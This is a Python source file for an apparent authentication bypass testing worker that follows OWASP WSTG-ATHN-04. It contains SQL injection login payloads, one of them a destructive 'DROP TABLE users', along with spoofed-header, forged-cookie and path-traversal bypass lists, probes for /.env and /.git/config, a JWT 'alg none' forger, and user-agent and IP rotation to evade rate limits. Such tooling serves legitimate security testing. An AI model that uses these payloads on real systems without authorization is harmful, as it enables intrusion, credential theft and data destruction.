"""Authentication bypass testing tool (WSTG-ATHN-04)."""

from __future__ import annotations

import asyncio
import base64
import json
import math
import random
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse

import httpx
from sqlalchemy import select

from lib_webbh import (
    Asset,
    JobState,
    Vulnerability,
    get_session,
    push_task,
    setup_logger,
)
from lib_webbh.scope import ScopeManager, ScopeResult

from workers.authentication.base_tool import AuthenticationTool
from workers.authentication.concurrency import WeightClass, get_semaphore

logger = setup_logger("auth-bypass-tester")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

_SQLI_PAYLOADS = [
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1--",
    '" OR ""="',
    "' OR 'x'='x",
    "1' OR '1'='1",
    "') OR ('1'='1",
    "' OR 1=1#",
    "admin'#",
    "' OR 'unusual'='unusual'--",
    "1 OR 1=1",
    "' OR ''='",
    '" OR 1=1--',
    "'; DROP TABLE users;--",
    "1; SELECT * FROM users--",
]

_RATE_LIMIT_SIGNALS = ["too many", "rate limit", "blocked", "try again", "slow down"]

_AUTH_REQUIRED_SIGNALS = [
    "login required",
    "please log in",
    "sign in to continue",
    "access denied",
    "authentication required",
]

_PROTECTED_PATHS = [
    "/admin", "/admin/dashboard", "/admin/users", "/admin/settings",
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/dashboard", "/profile", "/account", "/settings",
    "/console", "/manager", "/control-panel", "/portal",
    "/api/v1/users", "/api/v1/admin", "/api/v2/users",
    "/internal", "/debug",
    "/wp-admin", "/wp-json/wp/v2/users",
    "/phpmyadmin", "/pma",
    "/backup", "/backups",
    "/server-status", "/server-info",
    "/.env", "/config.json",
    "/.git/config", "/.htaccess",
    "/actuator/env",
    "/graphql",
]

_LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/authenticate",
    "/wp-login.php", "/admin/login", "/user/login",
    "/account/login", "/session/new", "/users/sign_in",
    "/auth/login", "/portal/login", "/panel/login",
]

_BYPASS_PARAMS = [
    ("authenticated", "yes"),
    ("admin", "true"),
    ("debug", "1"),
    ("bypass", "true"),
    ("auth", "1"),
    ("isAdmin", "true"),
]

_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
]

_BYPASS_COOKIES = [
    ("admin", "true"),
    ("admin", "1"),
    ("is_admin", "true"),
    ("role", "admin"),
    ("role", "administrator"),
    ("authenticated", "true"),
    ("isAuthenticated", "true"),
    ("access", "granted"),
]

_TRAVERSAL_PATHS = [
    "/admin/../admin",
    "/login/../admin",
    "/..;/admin",
    "/admin/..;/",
    "/%2e%2e/admin",
    "/./admin/./",
    "/admin/.",
    "/admin//",
]

_HTTP_METHODS = ["PUT", "DELETE", "PATCH", "HEAD"]

_SESSION_COOKIE_RE = re.compile(
    r"(?:PHPSESSID|JSESSIONID|sessionid|session|SESSID|ASP\.NET_SessionId|connect\.sid|sid|token)",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Tool class
# ---------------------------------------------------------------------------

class AuthBypassTester(AuthenticationTool):
    """Test for authentication bypass vulnerabilities (WSTG-ATHN-04)."""

    name = "auth_bypass_tester"
    weight_class = WeightClass.HEAVY

    def build_command(self, target, credentials=None) -> list[str]:
        return ["true"]

    def parse_output(self, stdout: str) -> list:
        return []

    # ------------------------------------------------------------------
    # Detection helpers
    # ------------------------------------------------------------------

    def _is_protected(self, response) -> bool:
        """Return True if response indicates authentication is required."""
        if response is None:
            return True
        if response.status_code in (401, 403):
            return True
        if response.status_code in (301, 302, 303, 307, 308):
            location = response.headers.get("location", "").lower()
            if any(x in location for x in ("login", "auth", "signin", "unauthorized")):
                return True
        text = response.text.lower() if response.text else ""
        return any(x in text for x in _AUTH_REQUIRED_SIGNALS)

    def _is_rate_limited(self, response) -> bool:
        """Return True if response signals rate-limiting or IP block."""
        if response is None:
            return False
        if response.status_code == 429:
            return True
        text = response.text.lower() if response.text else ""
        return any(x in text for x in _RATE_LIMIT_SIGNALS)

    # ------------------------------------------------------------------
    # Settings
    # ------------------------------------------------------------------

    def _load_settings_from_dir(self, config_dir: Path) -> dict:
        """Read probe settings from config_dir. Accepts a Path for testability."""
        rate_limits: dict = {}
        rl_path = config_dir / "rate_limits.json"
        if rl_path.exists():
            try:
                rate_limits = json.loads(rl_path.read_text())
            except (json.JSONDecodeError, OSError):
                pass

        custom_headers: dict = {}
        ch_path = config_dir / "custom_headers.json"
        if ch_path.exists():
            try:
                custom_headers = json.loads(ch_path.read_text())
            except (json.JSONDecodeError, OSError):
                pass

        bypass: dict = {}
        bp_path = config_dir / "bypass.json"
        if bp_path.exists():
            try:
                bypass = json.loads(bp_path.read_text())
            except (json.JSONDecodeError, OSError):
                pass

        user_agents = bypass.get("user_agents") or _DEFAULT_USER_AGENTS
        return {
            "probe_delay_secs": float(rate_limits.get("probe_delay_secs", 0.3)),
            "forced_browsing_delay_secs": float(bypass.get("forced_browsing_delay_secs", 0.3)),
            "sqli_delay_secs": float(bypass.get("sqli_delay_secs", 2.0)),
            "ip_rotation_pool": bypass.get("ip_rotation_pool", []),
            "user_agents": user_agents,
            "max_sqli_payloads": int(bypass.get("max_sqli_payloads", 15)),
            "custom_headers": custom_headers,
        }

    def _load_settings(self, target_id: int) -> dict:
        return self._load_settings_from_dir(Path(f"/app/shared/config/{target_id}"))

    # ------------------------------------------------------------------
    # Form parsing helpers
    # ------------------------------------------------------------------

    def _parse_form_fields(self, html: str) -> tuple[str, str]:
        """Return (username_field_name, password_field_name) from HTML form."""
        pw_match = re.search(
            r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']',
            html, re.IGNORECASE,
        ) or re.search(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
            html, re.IGNORECASE,
        )
        password_field = pw_match.group(1) if pw_match else "password"

        un_match = re.search(
            r'<input[^>]+type=["\'](?:text|email)["\'][^>]*name=["\']([^"\']+)["\']',
            html, re.IGNORECASE,
        ) or re.search(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
            html, re.IGNORECASE,
        )
        username_field = un_match.group(1) if un_match else "username"

        return username_field, password_field

    def _parse_form_action(self, html: str, fallback_url: str) -> str:
        """Extract form action URL; return fallback_url if no action found."""
        match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if match:
            action = match.group(1)
            if action.startswith("http"):
                return action
            parsed = urlparse(fallback_url)
            return f"{parsed.scheme}://{parsed.netloc}{action}"
        return fallback_url

    # ------------------------------------------------------------------
    # JWT helpers
    # ------------------------------------------------------------------

    def _extract_jwt(self, response) -> str | None:
        """Find a JWT pattern (header.payload.signature) in Set-Cookie header."""
        set_cookie = response.headers.get("set-cookie", "")
        match = re.search(
            r'(?:token|jwt|auth|session)=([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
            set_cookie,
        )
        return match.group(1) if match else None

    def _build_none_jwt(self, jwt_token: str) -> str:
        """Rebuild a JWT with 'none' algorithm, preserving the original payload."""
        try:
            parts = jwt_token.split(".")
            if len(parts) != 3:
                return jwt_token
            none_header = (
                base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}')
                .rstrip(b"=")
                .decode()
            )
            return f"{none_header}.{parts[1]}."
        except Exception:
            return jwt_token

    # ------------------------------------------------------------------
    # Entropy / prediction helpers
    # ------------------------------------------------------------------

    def _estimate_entropy(self, session_ids: list[str]) -> tuple[float, bool]:
        """Return (entropy_bits, is_sequential).

        entropy_bits: estimated via charset-size × avg-length.
        is_sequential: True if sorted numeric/hex IDs have max gap < 1000.
        """
        if not session_ids:
            return 0.0, False

        all_chars = set("".join(session_ids))
        charset_size = max(len(all_chars), 2)
        avg_length = sum(len(s) for s in session_ids) / len(session_ids)
        entropy_bits = avg_length * math.log2(charset_size)

        is_sequential = False
        try:
            nums = sorted(int(sid) for sid in session_ids)
            gaps = [nums[i + 1] - nums[i] for i in range(len(nums) - 1)]
            if gaps and max(gaps) < 1000:
                is_sequential = True
        except ValueError:
            try:
                nums = sorted(int(sid, 16) for sid in session_ids)
                gaps = [nums[i + 1] - nums[i] for i in range(len(nums) - 1)]
                if gaps and max(gaps) < 1000:
                    is_sequential = True
            except ValueError:
                pass

        return entropy_bits, is_sequential
